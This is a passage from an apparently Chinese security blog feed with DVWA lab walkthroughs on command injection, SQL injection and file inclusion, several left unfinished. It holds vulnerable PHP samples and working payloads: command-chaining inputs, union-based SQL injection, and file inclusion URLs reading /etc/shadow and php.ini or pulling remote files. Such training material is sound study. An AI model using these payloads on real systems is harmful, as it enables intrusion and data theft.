<h2 id="0x05-漏洞原理"><a href="#0x05-漏洞原理" class="headerlink" title="0x05 漏洞原理"></a>0x05 漏洞原理</h2><p>原理还是等有时间在搞吧。。。。。</p>
<p>参考： <a href="https://www.anquanke.com/post/id/181577" target="_blank" rel="noopener">https://www.anquanke.com/post/id/181577</a></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>Cobalt Strike 4.0学习</title>
    <url>/posts/7578.html</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>DVWA之Command Injection</title>
    <url>/posts/28539.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>命令执行漏洞的原理：在操作系统中， &amp;  、&amp;&amp; 、|  、 ||   都可以作为命令连接符使用，用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令<br>![](DVWA之Command Injection/CI1.jpg)</p>
<h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><h3 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a>核心代码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_POST[ &#39;Submit&#39; ]  ) ) &#123;</span><br><span class="line">    &#x2F;&#x2F; Get input</span><br><span class="line">    $target &#x3D; $_REQUEST[ &#39;ip&#39; ];</span><br><span class="line">    &#x2F;&#x2F; Determine OS and execute the ping command.</span><br><span class="line">    if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) &#123;</span><br><span class="line">        &#x2F;&#x2F; Windows</span><br><span class="line">        $cmd &#x3D; shell_exec( &#39;ping  &#39; . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        &#x2F;&#x2F; *nix</span><br><span class="line">        $cmd &#x3D; shell_exec( &#39;ping  -c 4 &#39; . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F; Feedback for the end user</span><br><span class="line">    echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>可以看到，low级别的代码接收了用户输入的ip，然后根据服务器是否是Windows NT系统，对目标ip进行不同的ping测试。但是这里对用户输入的ip并没有进行任何的过滤，所以我们可以进行命令执行漏洞。</p>
<p>我们ping一下百度的ip地址看看，可以看到能ping通</p>
<p>![](DVWA之Command Injection/CI2.jpg)</p>
<p>我们尝试输入 61.135.169.125 &amp; ipconfig  ,在操作系统中，”  &amp;  、&amp;&amp; 、|  、 ||   “都可以作为命令连接符使用,我们在ping完后再执行ipconfig 命令查看ip信息</p>
<p>可以看到，成功执行。然后我们就可以继续执行我们的命令了。把ipconfig换成其他的系统命令<br>![](DVWA之Command Injection/CI3.jpg)</p>
<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><h3 id="核心代码-1"><a href="#核心代码-1" class="headerlink" title="核心代码"></a>核心代码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">if( isset( $_POST[ &#39;Submit&#39; ]  ) ) &#123;</span><br><span class="line">    &#x2F;&#x2F; Get input</span><br><span class="line">    $target &#x3D; $_REQUEST[ &#39;ip&#39; ];</span><br><span class="line">    &#x2F;&#x2F; Set blacklist</span><br><span class="line">    $substitutions &#x3D; array(</span><br><span class="line">        &#39;&amp;&amp;&#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;;&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">    );</span><br><span class="line">    &#x2F;&#x2F; Remove any of the charactars in the array (blacklist).</span><br><span class="line">    $target &#x3D; str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; Determine OS and execute the ping command.</span><br><span class="line">    if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) &#123;</span><br><span class="line">        &#x2F;&#x2F; Windows</span><br><span class="line">        $cmd &#x3D; shell_exec( &#39;ping  &#39; . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        &#x2F;&#x2F; *nix</span><br><span class="line">        $cmd &#x3D; shell_exec( &#39;ping  -c 4 &#39; . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F; Feedback for the end user</span><br><span class="line">    echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>可以看到，medium级别的代码在low级别的代码上增加量了对 &amp;&amp; 和 ；的过滤，但是这并没有什么软用。</p>
<p>我们根本就不用 &amp;&amp; ，我们直接用 &amp;</p>
<p>&amp;&amp;和&amp;的区别在于，&amp;&amp;是执行完前面的命令然后执行后面的命令，&amp;是不管前面的命令是否值执行，后面的都执行</p>
<p>可以看到，我们直接按照low级别的命令就可以绕过执行。<br>![](DVWA之Command Injection/CI4.jpg)</p>
<p>由于使用的是<code>str_replace</code>把<code>”&amp;&amp;”</code>、<code>”;”</code>替换为空字符，因此可以采用以下方式绕过：</p>
<p><code>61.135.169.125&amp;;&amp;ipconfig</code></p>
<p>![](DVWA之Command Injection/CI5.jpg)</p>
<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><h3 id="核心代码-2"><a href="#核心代码-2" class="headerlink" title="核心代码"></a>核心代码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#39;Submit&#39; ]  ) ) &#123;</span><br><span class="line">    &#x2F;&#x2F; Get input</span><br><span class="line">    $target &#x3D; trim($_REQUEST[ &#39;ip&#39; ]);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Set blacklist</span><br><span class="line">    $substitutions &#x3D; array(</span><br><span class="line">        &#39;&amp;&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;;&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;| &#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;-&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;$&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;(&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;)&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;&#96;&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;||&#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Remove any of the charactars in the array (blacklist).</span><br><span class="line">    $target &#x3D; str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Determine OS and execute the ping command.</span><br><span class="line">    if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) &#123;</span><br><span class="line">        &#x2F;&#x2F; Windows</span><br><span class="line">        $cmd &#x3D; shell_exec( &#39;ping  &#39; . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        &#x2F;&#x2F; *nix</span><br><span class="line">        $cmd &#x3D; shell_exec( &#39;ping  -c 4 &#39; . $target );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Feedback for the end user</span><br><span class="line">    echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>可以看到，High级别的代码进行了黑名单过滤，把一些常见的命令连接符给过滤了。黑名单过滤看似安全，但是如果黑名单不全是话，是很容易进行绕过的。我们仔细看黑名单过滤中的<code>|</code>,<code>|</code>后面还有一个空格，所以我们可以进行绕过，输入下面命令。</p>
<p><code>61.135.169.125|ipconfig</code></p>
<p>![](DVWA之Command Injection/CI6.jpg)</p>
<p><code>|</code>是管道符，表示将Command 1的输出作为Command 2的输入，并且只打印Command 2执行的结果。</p>
<h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><h3 id="核心代码-3"><a href="#核心代码-3" class="headerlink" title="核心代码"></a>核心代码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#39;Submit&#39; ]  ) ) &#123;</span><br><span class="line">    &#x2F;&#x2F; Check Anti-CSRF token</span><br><span class="line">    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Get input</span><br><span class="line">    $target &#x3D; $_REQUEST[ &#39;ip&#39; ];</span><br><span class="line">    $target &#x3D; stripslashes( $target );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Split the IP into 4 octects</span><br><span class="line">    $octet &#x3D; explode( &quot;.&quot;, $target );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Check IF each octet is an integer</span><br><span class="line">    if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) &#x3D;&#x3D; 4 ) ) &#123;</span><br><span class="line">        &#x2F;&#x2F; If all 4 octets are int&#39;s put the IP back together.</span><br><span class="line">        $target &#x3D; $octet[0] . &#39;.&#39; . $octet[1] . &#39;.&#39; . $octet[2] . &#39;.&#39; . $octet[3];</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Determine OS and execute the ping command.</span><br><span class="line">        if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) &#123;</span><br><span class="line">            &#x2F;&#x2F; Windows</span><br><span class="line">            $cmd &#x3D; shell_exec( &#39;ping  &#39; . $target );</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            &#x2F;&#x2F; *nix</span><br><span class="line">            $cmd &#x3D; shell_exec( &#39;ping  -c 4 &#39; . $target );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Feedback for the end user</span><br><span class="line">        echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        &#x2F;&#x2F; Ops. Let the user name theres a mistake</span><br><span class="line">        echo &#39;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;&#x2F;pre&gt;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><code>stripslashes(string)</code>: 该函数会删除字符串<code>string</code>中的反斜杠，返回已剥离反斜杠的字符串。</p>
<p><code>explode(separator,string,limit)</code>: 该函数把字符串打散为数组，返回字符串的数组。参数<code>separator</code>规定在哪里分割字符串，参数<code>string</code>是要分割的字符串，可选参数<code>limit</code>规定所返回的数组元素的数目。</p>
<p><code>is_numeric(string)</code>: 该检测<code>string</code>是否为数字或数字字符串，如果是返回TRUE，否则返回FALSE。</p>
<p>可以看到，Impossible级别的代码加入了<code>Anti-CSRF token</code>，同时对参数ip进行了严格的限制，只有诸如“数字.数字.数字.数字”的输入才会被接收执行，因此不存在命令注入漏洞。</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title>DVWA之SQL Injecion</title>
    <url>/posts/38436.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>SQL Injection，即SQL注入，是指攻击者通过注入恶意的SQL命令，破坏SQL查询语句的结构，从而达到执行恶意SQL语句的目的。SQL注入漏洞的危害是巨大的，常常会导致整个数据库被“脱裤”，尽管如此，SQL注入仍是现在最常见的Web漏洞之一。</p>
<h2 id="手工注入的基本步骤"><a href="#手工注入的基本步骤" class="headerlink" title="手工注入的基本步骤"></a>手工注入的基本步骤</h2><ol>
<li>判断是否存在注入，注入是字符型还是数字型</li>
<li>猜解SQL查询语句中的字段数</li>
<li>确定显示的字段顺序</li>
<li>获取当前数据库</li>
<li>获取数据库中的表</li>
<li>获取表中的字段名</li>
<li>下载数据</li>
</ol>
<h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><h3 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a>核心代码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_REQUEST[ &#39;Submit&#39; ] ) ) &#123;</span><br><span class="line">    &#x2F;&#x2F; Get input</span><br><span class="line">    $id &#x3D; $_REQUEST[ &#39;id&#39; ];</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Check database</span><br><span class="line">    $query  &#x3D; &quot;SELECT first_name, last_name FROM users WHERE user_id &#x3D; &#39;$id&#39;;&quot;;</span><br><span class="line">    $result &#x3D; mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res &#x3D; mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;&#x2F;pre&gt;&#39; );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Get results</span><br><span class="line">    while( $row &#x3D; mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">        &#x2F;&#x2F; Get values</span><br><span class="line">        $first &#x3D; $row[&quot;first_name&quot;];</span><br><span class="line">        $last  &#x3D; $row[&quot;last_name&quot;];</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Feedback for end user</span><br><span class="line">        echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br &#x2F;&gt;First name: &#123;$first&#125;&lt;br &#x2F;&gt;Surname: &#123;$last&#125;&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>可以看到，Low级别的代码对来自客户端的参数id没有进行任何的检查与过滤，存在明显的SQL注入。</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>现实攻击场景下，攻击者是无法看到后端代码的，所以下面的手工注入步骤是建立在无法看到源码的基础上。</p>
<ol>
<li><p>判断是否存在注入，注入是字符型还是数字型<br>输入 <code>1</code> ，查询成功<br>![](DVWA之SQL Injecion/SI1.jpg)</p>
<p>输入 <code>1&#39; and &#39;1&#39;=&#39;2</code>，查询失败，<br>![](DVWA之SQL Injecion/SI2.jpg)</p>
<p>输入 <code>1&#39; or &#39;1234&#39;=&#39;1234</code>，查询成功，返回多个结果<br>![](DVWA之SQL Injecion/SI3.jpg)</p>
<p>说明存在字符型注入。</p>
</li>
<li><p>猜解SQL查询语句中的字段数<br>输入<code>1&#39; or 1=1 order by 1 #</code>，查询成功：<br>![](DVWA之SQL Injecion/SI4.jpg)</p>
<p>输入<code>1&#39; or 1=1 order by 3 #</code>，查询失败：<br>![](DVWA之SQL Injecion/SI5.jpg)</p>
<p>输入<code>1&#39; or 1=1 order by 2 #</code>，查询成功：<br>![](DVWA之SQL Injecion/SI6.jpg)</p>
<p>说明执行的SQL查询语句中只有两个字段，即这里的<code>First name</code>、<code>Surname</code>。</p>
</li>
<li><p>确定显示的字段顺序<br>输入1’ union select 1,2 #，查询成功：<br>![](DVWA之SQL Injecion/SI7.jpg)</p>
<p>说明执行的SQL语句为<code>select First name,Surname from 表 where ID=’id’…</code></p>
</li>
<li><p>获取当前数据库<br>输入<code>1&#39; union select 1,database() #</code>，查询成功：<br>![](DVWA之SQL Injecion/SI8.jpg)</p>
<p>说明当前的数据库为dvwa。</p>
</li>
<li><p>获取数据库中的表<br>输入<code>1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#</code>，查询成功：<br>![](DVWA之SQL Injecion/SI9.jpg)</p>
<p>说明数据库dvwa中一共有两个表，<code>guestbook</code>与<code>users</code>。</p>
</li>
<li><p>获取表中的字段名</p>
</li>
</ol>
<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><h3 id="核心代码-1"><a href="#核心代码-1" class="headerlink" title="核心代码"></a>核心代码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#39;Submit&#39; ] ) ) &#123;</span><br><span class="line">    &#x2F;&#x2F; Get input</span><br><span class="line">    $id &#x3D; $_POST[ &#39;id&#39; ];</span><br><span class="line"></span><br><span class="line">    $id &#x3D; mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $id);</span><br><span class="line"></span><br><span class="line">    $query  &#x3D; &quot;SELECT first_name, last_name FROM users WHERE user_id &#x3D; $id;&quot;;</span><br><span class="line">    $result &#x3D; mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query) or die( &#39;&lt;pre&gt;&#39; . mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) . &#39;&lt;&#x2F;pre&gt;&#39; );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Get results</span><br><span class="line">    while( $row &#x3D; mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">        &#x2F;&#x2F; Display values</span><br><span class="line">        $first &#x3D; $row[&quot;first_name&quot;];</span><br><span class="line">        $last  &#x3D; $row[&quot;last_name&quot;];</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Feedback for end user</span><br><span class="line">        echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br &#x2F;&gt;First name: &#123;$first&#125;&lt;br &#x2F;&gt;Surname: &#123;$last&#125;&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; This is used later on in the index.php page</span><br><span class="line">&#x2F;&#x2F; Setting it here so we can close the database connection in here like in the rest of the source scripts</span><br><span class="line">$query  &#x3D; &quot;SELECT COUNT(*) FROM users;&quot;;</span><br><span class="line">$result &#x3D; mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res &#x3D; mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;&#x2F;pre&gt;&#39; );</span><br><span class="line">$number_of_rows &#x3D; mysqli_fetch_row( $result )[0];</span><br><span class="line"></span><br><span class="line">mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><h3 id="核心代码-2"><a href="#核心代码-2" class="headerlink" title="核心代码"></a>核心代码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_SESSION [ &#39;id&#39; ] ) ) &#123;</span><br><span class="line">    &#x2F;&#x2F; Get input</span><br><span class="line">    $id &#x3D; $_SESSION[ &#39;id&#39; ];</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Check database</span><br><span class="line">    $query  &#x3D; &quot;SELECT first_name, last_name FROM users WHERE user_id &#x3D; &#39;$id&#39; LIMIT 1;&quot;;</span><br><span class="line">    $result &#x3D; mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#39;&lt;pre&gt;Something went wrong.&lt;&#x2F;pre&gt;&#39; );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Get results</span><br><span class="line">    while( $row &#x3D; mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">        &#x2F;&#x2F; Get values</span><br><span class="line">        $first &#x3D; $row[&quot;first_name&quot;];</span><br><span class="line">        $last  &#x3D; $row[&quot;last_name&quot;];</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Feedback for end user</span><br><span class="line">        echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br &#x2F;&gt;First name: &#123;$first&#125;&lt;br &#x2F;&gt;Surname: &#123;$last&#125;&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res &#x3D; mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);        </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><h3 id="核心代码-3"><a href="#核心代码-3" class="headerlink" title="核心代码"></a>核心代码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">if( isset( $_GET[ &#39;Submit&#39; ] ) ) &#123;</span><br><span class="line">    &#x2F;&#x2F; Check Anti-CSRF token</span><br><span class="line">    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Get input</span><br><span class="line">    $id &#x3D; $_GET[ &#39;id&#39; ];</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Was a number entered?</span><br><span class="line">    if(is_numeric( $id )) &#123;</span><br><span class="line">        &#x2F;&#x2F; Check the database</span><br><span class="line">        $data &#x3D; $db-&gt;prepare( &#39;SELECT first_name, last_name FROM users WHERE user_id &#x3D; (:id) LIMIT 1;&#39; );</span><br><span class="line">        $data-&gt;bindParam( &#39;:id&#39;, $id, PDO::PARAM_INT );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line">        $row &#x3D; $data-&gt;fetch();</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Make sure only 1 result is returned</span><br><span class="line">        if( $data-&gt;rowCount() &#x3D;&#x3D; 1 ) &#123;</span><br><span class="line">            &#x2F;&#x2F; Get values</span><br><span class="line">            $first &#x3D; $row[ &#39;first_name&#39; ];</span><br><span class="line">            $last  &#x3D; $row[ &#39;last_name&#39; ];</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F; Feedback for end user</span><br><span class="line">            echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br &#x2F;&gt;First name: &#123;$first&#125;&lt;br &#x2F;&gt;Surname: &#123;$last&#125;&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>DVWA</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>DVWA之File Inclusion</title>
    <url>/posts/21204.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>File Inclusion，意思是文件包含（漏洞），是指当服务器开启<code>allow_url_include</code>选项时，就可以通过php的某些特性函数（<code>include()</code>，<code>require()</code>和<code>include_once()</code>，<code>require_once()</code>）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的<code>allow_url_fopen</code>选项（选项开启之后，服务器允许包含一个远程的文件）。<br>![](DVWA之File Inclusion/FI1.jpg)</p>
<h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><h3 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a>核心代码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; The page we wish to display</span><br><span class="line">$file &#x3D; $_GET[ &#39;page&#39; ];</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>可以看到，服务器端对page参数没有做任何的过滤跟检查。</p>
<p>服务器期望用户的操作是点击下面的三个链接，服务器会包含相应的文件，并将结果返回。需要特别说明的是，服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。</p>
<p>点击<code>file1.php</code>后，显示如下:<br>![](DVWA之File Inclusion/FI2.jpg)<br>而现实中，恶意的攻击者是不会乖乖点击这些链接的，因此page参数是不可控的。</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h4><p>构造url：<br><a href="http://127.0.0.1/DVWA/vulnerabilities/fi/?page=/etc/shadow" target="_blank" rel="noopener">http://127.0.0.1/DVWA/vulnerabilities/fi/?page=/etc/shadow</a></p>
<p>![](DVWA之File Inclusion/FI3.jpg)<br>报错，显示没有这个文件，说明服务器系统不是Linux，但同时暴露了服务器文件的绝对路径 C:\phpStudy\PHPTutorial\WWW\DVWA\vulnerabilities\fi\index.php。</p>
<p>构造url（绝对路径）：<br><a href="http://127.0.0.1/DVWA/vulnerabilities/fi/?page=C:\phpStudy\PHPTutorial\WWW\DVWA\php.ini" target="_blank" rel="noopener">http://127.0.0.1/DVWA/vulnerabilities/fi/?page=C:\phpStudy\PHPTutorial\WWW\DVWA\php.ini</a><br>![](DVWA之File Inclusion/FI4.jpg)<br>成功读取了服务器的php.ini文件</p>
<p>构造url（相对路径）：<br>。。。。。。待续</p>
<h4 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h4><p>当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。</p>
<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><h3 id="核心代码-1"><a href="#核心代码-1" class="headerlink" title="核心代码"></a>核心代码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; The page we wish to display</span><br><span class="line">$file &#x3D; $_GET[ &#39;page&#39; ];</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Input validation</span><br><span class="line">$file &#x3D; str_replace( array( &quot;http:&#x2F;&#x2F;&quot;, &quot;https:&#x2F;&#x2F;&quot; ), &quot;&quot;, $file );</span><br><span class="line">$file &#x3D; str_replace( array( &quot;..&#x2F;&quot;, &quot;..\&quot;&quot; ), &quot;&quot;, $file );</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>可以看到，Medium级别的代码增加了str_replace函数，对page参数进行了一定的处理，将”http:// ”、”https://”、 ” ../”、”..\”替换为空字符，即删除。</p>
<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用<code>str_replace</code>函数是极其不安全的，因为可以使用双写绕过替换规则。<br>例如<code>page=hthttp://tp://192.168.5.12/phpinfo.txt</code>时，<code>str_replace</code>函数会将<code>http://</code>删除，于是<code>page=http://192.168.5.12/phpinfo.txt</code>，成功执行远程命令。</p>
<p>同时，因为替换的只是“../”、“..\”，所以对采用绝对路径的方式包含文件是不会受到任何限制的。</p>
<p><strong>本地文件包含</strong><br><a href="http://192.168.153.130/dvwa/vulnerabilities/fi/page=…/./…/./…/./…/./…/./…/./…/./…/./…/./…/./xampp/htdocs/dvwa/php.ini" target="_blank" rel="noopener">http://192.168.153.130/dvwa/vulnerabilities/fi/page=…/./…/./…/./…/./…/./…/./…/./…/./…/./…/./xampp/htdocs/dvwa/php.ini</a></p>
<p><strong>远程文件包含</strong></p>
<p><a href="http://192.168.153.130/dvwa/vulnerabilities/fi/page=htthttp://p://192.168.5.12/phpinfo.txt" target="_blank" rel="noopener">http://192.168.153.130/dvwa/vulnerabilities/fi/page=htthttp://p://192.168.5.12/phpinfo.txt</a></p>
